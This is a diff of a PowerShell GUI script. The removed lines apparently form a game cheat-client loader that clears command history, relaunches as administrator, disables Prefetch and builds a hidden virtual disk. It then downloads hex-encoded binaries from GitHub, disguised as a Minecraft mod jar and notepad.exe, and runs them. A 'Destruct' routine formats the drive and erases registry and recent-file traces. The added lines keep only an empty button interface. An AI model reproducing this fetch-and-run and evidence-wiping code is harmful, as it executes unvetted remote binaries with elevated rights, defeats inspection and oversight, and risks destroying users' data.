@@ -1,320 +1,12 @@
-Add-Type -AssemblyName 'System.Windows.Forms'
-Set-PSReadlineOption -HistorySaveStyle SaveNothing
-Clear-Content -Path "C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
+Add-Type -AssemblyName System.Windows.Forms
+Add-Type -AssemblyName System.Drawing
 
-if (!([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
-    Start-Process powershell.exe "-File `"$PSCommandPath`"" -Verb RunAs
-    exit
-}
-
-attrib -R "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
-
-# Check if F:\notepad.exe exists
-if (Test-Path "F:\notepad.exe") {
-    Write-Host "F:\notepad.exe found. Executing instructions..."
-
-    try {
-        # Format the volume
-        Get-Volume -DriveLetter F | Format-Volume -FileSystem FAT32 -NewFileSystemLabel "MyDrive" -Full -Force
-
-        # Remove registry entry
-        Remove-Item -Path "Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Search\VolumeInfoCache\F:" -Recurse -Force
-
-        # Define the virtual disk path and disk number (from your previous setup)
-        $vdiskPath = "C:\temp\ddr.vhd"
-        $diskNumber = 3  # Replace with the correct disk number from your system
-
-        # Step 1: Dismount (detach) the virtual disk if attached
-        $detachScript = @"
-select vdisk file='$vdiskPath'
-detach vdisk
-"@
-        $detachVhdFile = "C:\temp\$(Get-Random -Minimum 10000 -Maximum 99999)"
-        $detachScript | Set-Content -Path $detachVhdFile
-        diskpart /s $detachVhdFile
-        Remove-Item -Path $detachVhdFile -Force
-
-        # Step 2: Initialize the disk (if it's not initialized already)
-        $initializeDiskScript = @"
-select disk $diskNumber
-online disk
-convert mbr
-"@
-        $initializeDiskFile = "C:\temp\$(Get-Random -Minimum 10000 -Maximum 99999)"
-        $initializeDiskScript | Set-Content -Path $initializeDiskFile
-        diskpart /s $initializeDiskFile
-        Remove-Item -Path $initializeDiskFile -Force
-
-        # Step 3: Create a partition if none exists
-        $createPartitionScript = @"
-select disk $diskNumber
-create partition primary
-"@
-        $createPartitionFile = "C:\temp\$(Get-Random -Minimum 10000 -Maximum 99999)"
-        $createPartitionScript | Set-Content -Path $createPartitionFile
-        diskpart /s $createPartitionFile
-        Remove-Item -Path $createPartitionFile -Force
-
-        # Step 4: Remove the virtual disk file from the system
-        Remove-Item -Path $vdiskPath -Force
-
-        # Step 5: Delete shortcut files from the Recent folder
-        $recentFolderPath = [Environment]::GetFolderPath("Recent")
-        Get-ChildItem -Path $recentFolderPath -Filter "*.lnk" | Where-Object { 
-            $_.Name -like "javaruntime.ps1*" -or $_.Name -like "powershell*" 
-        } | ForEach-Object {
-            Remove-Item -Path $_.FullName -Force -ErrorAction SilentlyContinue
-        }
-
-        # Output a confirmation message
-        Write-Host "Destruction complete: Virtual disk, partitions, and recent files removed successfully."
-
-        # Remove drive letter association from the registry (if applicable)
-        Remove-ItemProperty -Path "HKLM:\SYSTEM\MountedDevices" -Name "\DosDevices\F:" -ErrorAction SilentlyContinue
-
-    } catch {
-        Write-Host "An error occurred: $_"
-    }
-} else {
-    Write-Host "F:\notepad.exe not found. Skipping instructions."
-}
-
-$services = @("PcaSvc", "DPS", "DiagTrack", "SysMain", "EventLog")
-
-function Set-ServiceAutoStart {
-    param ([string]$serviceName)
-    Set-Service -Name $serviceName -StartupType Automatic
-    Start-Service -Name $serviceName
-}
-
-Start-Process -FilePath "C:\Windows\System32\consent.exe"
-
-foreach ($service in $services) {
-    Set-ServiceAutoStart -serviceName $service
-}
-
-# Define the drive letter as F:
-$driveLetter = "F"
-
-# Create a new form (window)
+# Create the form
 $form = New-Object System.Windows.Forms.Form
-$form.Width = 900
-$form.Height = 400
+$form.Text = 'ASCII UI'
+$form.Size = New-Object System.Drawing.Size(650, 400)
 $form.StartPosition = 'CenterScreen'
-$form.FormBorderStyle = 'FixedDialog'
-$form.MaximizeBox = $false
-$form.MinimizeBox = $false
 $form.BackColor = 'Black'
-$form.Text = ""
-$form.ForeColor = 'White'
-
-# Add a label to display ASCII art
-$asciiArt = @"
-   __   ____  ___   ___  _____  _______
-  / /  / __ \/ _ | / _ \/  _/ |/ / ___/
- / /__/ /_/ / __ |/ // // //    / (_ / 
-/____/\____/_/ |_/____/___/_/|_/\___/
-"@
-
-$label = New-Object System.Windows.Forms.Label
-$label.Text = $asciiArt
-$label.Font = New-Object System.Drawing.Font("Consolas", 20)
-$label.ForeColor = 'Yellow'
-$label.AutoSize = $true
-
-# Center the label within the form
-$label.Location = New-Object System.Drawing.Point(
-    [int](($form.ClientSize.Width - $label.PreferredWidth) / 2),
-    [int](($form.ClientSize.Height - $label.PreferredHeight) / 2)
-)
-$form.Controls.Add($label)
-
-# Adjust the label's location when the form resizes
-$form.add_SizeChanged({
-    $label.Location = New-Object System.Drawing.Point(
-        [int](($form.ClientSize.Width - $label.PreferredWidth) / 2),
-        [int](($form.ClientSize.Height - $label.PreferredHeight) / 2)
-    )
-})
-
-# Show the form
-$form.Show()
-
-# Disable Prefetch
-Remove-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" -Name "EnablePrefetcher" -ErrorAction SilentlyContinue
-
-# Ensure the directory exists
-$vdiskPath = "C:\temp\ddr.vhd"
-$vdiskSizeMB = 2048 # Size of the virtual disk in MB (2 GB)
-
-# Step 1: Check if the virtual disk already exists and remove it if it does
-if (Test-Path -Path $vdiskPath) {
-  Remove-Item -Path $vdiskPath -Force
-}
-
-# Step 2: Create the virtual disk (expandable)
-$createVHDScript = @"
-create vdisk file=`"$vdiskPath`" maximum=$vdiskSizeMB type=expandable
-"@
-$scriptFileCreate = "C:\temp\$(Get-Random -Minimum 10000 -Maximum 99999)"
-$createVHDScript | Set-Content -Path $scriptFileCreate
-
-# Execute the diskpart command to create the virtual disk
-diskpart /s $scriptFileCreate
-
-# Step 3: Attach the virtual disk
-$attachVHDScript = @"
-select vdisk file=`"$vdiskPath`"
-attach vdisk
-"@
-$scriptFileAttach = "C:\temp\$(Get-Random -Minimum 10000 -Maximum 99999)"
-$attachVHDScript | Set-Content -Path $scriptFileAttach
-
-# Execute the diskpart command to attach the virtual disk
-diskpart /s $scriptFileAttach
-
-# Step 4: Wait for the disk to be detected by the system
-Start-Sleep -Seconds 5  # Allow a moment for the disk to be registered by the OS
-
-# Retrieve the attached disk (assuming it's the last disk created)
-$disk = Get-Disk | Sort-Object -Property Number | Select-Object -Last 1
-
-# Check if the disk is offline, and set it online if needed
-if ($disk.IsOffline -eq $true) {
-    Set-Disk -Number $disk.Number -IsOffline $false
-}
-
-# Initialize the disk if it's in raw state (uninitialized)
-if ($disk.PartitionStyle -eq 'Raw') {
-    Initialize-Disk -Number $disk.Number -PartitionStyle MBR
-}
-
-# Step 5: Create a new partition with the remaining size
-$partition = New-Partition -DiskNumber $disk.Number -UseMaximumSize -AssignDriveLetter
-
-# Retrieve the drive letter of the new partition
-$driveLetter = $partition.DriveLetter
-
-# Step 6: Format the volume with FAT32 and set label
-Format-Volume -DriveLetter $driveLetter -FileSystem FAT32 -NewFileSystemLabel "VirtualDisk" -Confirm:$false
-
-# Step 7: Create a new file called sodium-fabric-0.6.0+mc1.21.1.jar on the new drive
-$virtualDiskPathJar = "${driveLetter}:\sodium-fabric-0.6.0+mc1.21.1.jar"
-New-Item -Path $virtualDiskPathJar -ItemType File
-
-# Function to download hex data from a URL
-function Get-HexData {
-    param ([string]$url)
-    
-    try {
-        $response = Invoke-WebRequest -Uri $url -TimeoutSec 30
-        return $response.Content
-    } catch {
-        Write-Host ("Error fetching data: {0}" -f $_.Exception.Message)
-        return $null
-    }
-}
-
-# Function to convert hex string to byte array
-function Convert-HexToBytes {
-    param ([string]$hex)
-
-    if ($hex.Length % 2 -ne 0) {
-        Write-Host "Error: Hex string length is not even."
-        return $null
-    }
-
-    $byteArray = New-Object Byte[] ($hex.Length / 2)
-    for ($i = 0; $i -lt $hex.Length; $i += 2) {
-        $byteArray[$i / 2] = [convert]::ToByte($hex.Substring($i, 2), 16)
-    }
-    return $byteArray
-}
-
-# Function to write binary data to a file
-function Write-BinaryToFile {
-    param ([string]$filePath, [byte[]]$data)
-
-    try {
-        [System.IO.File]::WriteAllBytes($filePath, $data)
-    } catch {
-        Write-Host "Error writing binary data to file: $filePath"
-    }
-}
-
-# Main logic to download hex data and write to .jar file
-$hexUrlJar = "https://raw.githubusercontent.com/Zpat279/PresPub/refs/heads/main/Pres1.md"
-$hexDataJar = Get-HexData -url $hexUrlJar
-
-if ($null -ne $hexDataJar) {
-    $hexCodePayloadJar = -join ($hexDataJar -replace '[^0-9A-Fa-f]', '')
-
-    if ($hexCodePayloadJar.Length % 2 -eq 0) {
-        $binaryDataJar = Convert-HexToBytes -hex $hexCodePayloadJar
-
-        if ($null -ne $binaryDataJar) {
-            Write-BinaryToFile -filePath $virtualDiskPathJar -data $binaryDataJar
-        } else {
-            Write-Host "Error: Conversion to bytes failed."
-        }
-    } else {
-        Write-Host "Error: Invalid hex data received."
-    }
-} else {
-    Write-Host "No hex data fetched."
-}
-
-# Step 8: Create a new file called notepad.exe on the new drive
-$virtualDiskPathExe = "${driveLetter}:\notepad.exe"
-New-Item -Path $virtualDiskPathExe -ItemType File
-
-# Main logic to download hex data and write to .exe file
-$hexUrlExe = "https://raw.githubusercontent.com/Zpat279/vap2/refs/heads/main/vap2"
-$hexDataExe = Get-HexData -url $hexUrlExe
-
-if ($null -ne $hexDataExe) {
-    $hexCodePayloadExe = -join ($hexDataExe -replace '[^0-9A-Fa-f]', '')
-
-    if ($hexCodePayloadExe.Length % 2 -eq 0) {
-        $binaryDataExe = Convert-HexToBytes -hex $hexCodePayloadExe
-
-        if ($null -ne $binaryDataExe) {
-            Write-BinaryToFile -filePath $virtualDiskPathExe -data $binaryDataExe
-        } else {
-            Write-Host "Error: Conversion to bytes failed."
-        }
-    } else {
-        Write-Host "Error: Invalid hex data received."
-    }
-} else {
-    Write-Host "No hex data fetched."
-}
-
-# Re-enable Prefetch
-New-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" -Name "EnablePrefetcher" -PropertyType DWord -Value 3 -Force
-Write-Host "Prefetch re-enabled with 'EnablePrefetcher' set to 3."
-
-# Close the old form
-$form.Close()
-
-# Create a new form (window)
-$form = New-Object System.Windows.Forms.Form
-$form.Width = 950
-$form.Height = 400
-$form.StartPosition = 'CenterScreen'  # Center the form on the screen
-
-# Set background color to black and make the window non-resizable
-$form.FormBorderStyle = 'FixedDialog'
-$form.MaximizeBox = $false
-$form.MinimizeBox = $false
-$form.BackColor = 'Black'  # Set background color of the form to black
-
-# Set the title to empty (remove the title)
-$form.Text = "" 
-
-# Set the top bar (title bar) color to black
-$form.BackColor = 'Black'  # Set background color for the whole form
-$form.ForeColor = 'White'  # Set text color for the form content
 
 # Create a label to display the ASCII art
 $asciiArt = @"
@@ -328,12 +20,11 @@ $asciiArt = @"
 
 $label = New-Object System.Windows.Forms.Label
 $label.Text = $asciiArt
-$label.Font = New-Object System.Drawing.Font('Courier New', 9)  # Use a monospace font for ASCII art
-$label.ForeColor = 'Yellow'  # Set the ASCII art color to yellow
+$label.Font = New-Object System.Drawing.Font('Courier New', 9)
+$label.ForeColor = 'Yellow'
 $label.AutoSize = $true
-$label.Location = New-Object System.Drawing.Point(50, 50)  # Position the label
+$label.Location = New-Object System.Drawing.Point(50, 50)
 
-# Add the label to the form
 $form.Controls.Add($label)
 
 # Create "Inject" Button
@@ -341,43 +32,51 @@ $injectButton = New-Object System.Windows.Forms.Button
 $injectButton.Text = 'Inject'
 $injectButton.Width = 100
 $injectButton.Height = 40
-$injectButton.Location = New-Object System.Drawing.Point(162.5, 200)  # Position the button
+$injectButton.Location = New-Object System.Drawing.Point(162, 200)
 $injectButton.BackColor = 'Green'
 $injectButton.ForeColor = 'Black'
+
+# Create "Destruct" Button (missing from your original code but used in Back)
+$destructButton = New-Object System.Windows.Forms.Button
+$destructButton.Text = 'Destruct'
+$destructButton.Width = 100
+$destructButton.Height = 40
+$destructButton.Location = New-Object System.Drawing.Point(280, 200)
+$destructButton.BackColor = 'Red'
+$destructButton.ForeColor = 'Black'
 
 # Add the Inject button click event
 $injectButton.Add_Click({
     $form.Controls.Clear()
     $form.Controls.Add($label)
 
-    # Create "Prestige" Button
+    # "Prestige" Button
     $prestigeButton = New-Object System.Windows.Forms.Button
     $prestigeButton.Text = 'Prestige'
     $prestigeButton.Width = 100
     $prestigeButton.Height = 40
-    $prestigeButton.Location = New-Object System.Drawing.Point(150, 200)  # Position the button
+    $prestigeButton.Location = New-Object System.Drawing.Point(150, 200)
     $prestigeButton.BackColor = 'Purple'
     $prestigeButton.ForeColor = 'Black'
 
-    # Create "Vape" Button
+    # "Vape" Button
     $vapeButton = New-Object System.Windows.Forms.Button
     $vapeButton.Text = 'Vape'
     $vapeButton.Width = 100
     $vapeButton.Height = 40
-    $vapeButton.Location = New-Object System.Drawing.Point(300, 200)  # Position the button
+    $vapeButton.Location = New-Object System.Drawing.Point(300, 200)
     $vapeButton.BackColor = 'Blue'
     $vapeButton.ForeColor = 'Black'
 
-    # Create "Back" Button
+    # "Back" Button
     $backButton = New-Object System.Windows.Forms.Button
     $backButton.Text = 'Back'
     $backButton.Width = 100
     $backButton.Height = 40
-    $backButton.Location = New-Object System.Drawing.Point(450, 200)  # Position the button
+    $backButton.Location = New-Object System.Drawing.Point(450, 200)
     $backButton.BackColor = 'DarkRed'
     $backButton.ForeColor = 'Black'
 
-    # Add the Back button click event
     $backButton.Add_Click({
         $form.Controls.Clear()
         $form.Controls.Add($label)
@@ -385,151 +84,14 @@ $injectButton.Add_Click({
         $form.Controls.Add($destructButton)
     })
 
-    # Add event handler for prestige buttonn
-$prestigeButton.Add_Click({
-    # Disable Prefetch
-    Remove-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" -Name "EnablePrefetcher" -ErrorAction SilentlyContinue
-    
-    # Execute Java JAR file
-    Start-Process "java" -ArgumentList "-jar F:\sodium-fabric-0.6.0+mc1.21.1.jar"
-    Write-Host "Java JAR file executed."
-    
-    # Wait for 5 seconds
-    Start-Sleep -Seconds 5
-    
-    # Monitor for java.exe process
-    Write-Host "Monitoring for 'java.exe'..."
-    do {
-        # Check for the presence of java.exe process
-        $javaProcesses = Get-Process -Name "java" -ErrorAction SilentlyContinue
-        Start-Sleep -Seconds 1
-    } while ($javaProcesses.Count -ne 0)
-    
-    Write-Host "'java.exe' process is no longer running."
-    
-    # Re-enable Prefetch
-    New-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" -Name "EnablePrefetcher" -PropertyType DWord -Value 3 -Force
-    Write-Host "Prefetch re-enabled with 'EnablePrefetcher' set to 3."
-})
-
-# Add event handler for button click
-$vapeButton.Add_Click({
-    # Disable Prefetch
-    Remove-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" -Name "EnablePrefetcher" -ErrorAction SilentlyContinue
-    
-    # Launch Notepad
-    Start-Process "F:\notepad.exe"
-    Write-Host "Notepad launched."
-    
-    # Wait for 5 seconds
-    Start-Sleep -Seconds 5
-    
-    # Monitor for notepad.exe process
-    Write-Host "Monitoring for 'notepad.exe'..."
-    do {
-        # Check for the presence of notepad.exe process
-        $notepadProcesses = Get-Process -Name "notepad" -ErrorAction SilentlyContinue
-        Start-Sleep -Seconds 1
-    } while ($notepadProcesses.Count -ne 0)
-    
-    Write-Host "'notepad.exe' process is no longer running."
-    
-    # Re-enable Prefetch
-    New-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" -Name "EnablePrefetcher" -PropertyType DWord -Value 3 -Force
-    Write-Host "Prefetch re-enabled with 'EnablePrefetcher' set to 3."
-})
-
-    # Add the buttons to the form
     $form.Controls.Add($prestigeButton)
     $form.Controls.Add($vapeButton)
     $form.Controls.Add($backButton)
 })
 
-# Add the Inject button to the form
+# Add initial buttons
 $form.Controls.Add($injectButton)
-
-# Create "Destruct" Button
-$destructButton = New-Object System.Windows.Forms.Button
-$destructButton.Text = 'Destruct'
-$destructButton.Width = 100
-$destructButton.Height = 40
-$destructButton.Location = New-Object System.Drawing.Point(687.5, 200)  # Position the button
-$destructButton.BackColor = 'Red'
-$destructButton.ForeColor = 'Black'
-
-# Add the Destruct button to the form
 $form.Controls.Add($destructButton)
 
-# Event handler for Destruct button click
-$destructButton.Add_Click({
-    try {
-        # Format the volume
-        Get-Volume -DriveLetter F | Format-Volume -FileSystem FAT32 -NewFileSystemLabel "MyDrive" -Full -Force
-
-        Remove-Item -Path "Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Search\VolumeInfoCache\F:" -Recurse -Force
-
-        # Define the virtual disk path and disk number (from your previous setup)
-        $vdiskPath = "C:\temp\ddr.vhd"
-        $diskNumber = 3  # Replace with the correct disk number from your system
-
-        # Step 1: Dismount (detach) the virtual disk if attached
-        $detachScript = @"
-select vdisk file='$vdiskPath'
-detach vdisk
-"@
-        $detachVhdFile = "C:\temp\$(Get-Random -Minimum 10000 -Maximum 99999)"
-        $detachScript | Set-Content -Path $detachVhdFile
-        diskpart /s $detachVhdFile
-        Remove-Item -Path $detachVhdFile -Force
-
-        # Step 2: Initialize the disk (if it's not initialized already)
-        $initializeDiskScript = @"
-select disk $diskNumber
-online disk
-convert mbr
-"@
-        $initializeDiskFile = "C:\temp\$(Get-Random -Minimum 10000 -Maximum 99999)"
-        $initializeDiskScript | Set-Content -Path $initializeDiskFile
-        diskpart /s $initializeDiskFile
-        Remove-Item -Path $initializeDiskFile -Force
-
-        # Step 3: Create a partition if none exists
-        $createPartitionScript = @"
-select disk $diskNumber
-create partition primary
-"@
-        $createPartitionFile = "C:\temp\$(Get-Random -Minimum 10000 -Maximum 99999)"
-        $createPartitionScript | Set-Content -Path $createPartitionFile
-        diskpart /s $createPartitionFile
-        Remove-Item -Path $createPartitionFile -Force
-
-        # Step 4: Remove the virtual disk file from the system
-        Remove-Item -Path $vdiskPath -Force
-
-        # Step 5: Delete shortcut files from the Recent folder
-        $recentFolderPath = [Environment]::GetFolderPath("Recent")
-        Get-ChildItem -Path $recentFolderPath -Filter "*.lnk" | Where-Object { 
-            $_.Name -like "javaruntime.ps1*" -or $_.Name -like "powershell*" 
-        } | ForEach-Object {
-            Remove-Item -Path $_.FullName -Force -ErrorAction SilentlyContinue
-        }
-
-        # Output a confirmation message
-        Write-Host "Destruction complete: Virtual disk, partitions, and recent files removed successfully."
-
-        # Remove drive letter association from the registry (if applicable)
-        Remove-ItemProperty -Path "HKLM:\SYSTEM\MountedDevices" -Name "\DosDevices\F:" -ErrorAction SilentlyContinue
-
-        # Stop the script process
-        Stop-Process -Id $PID
-    } catch {
-        Write-Host "An error occurred: $_"
-    }
-})
-
-
-
-# Display the form
-$form.ShowDialog()
-
-
+# Run the form
+[void]$form.ShowDialog()
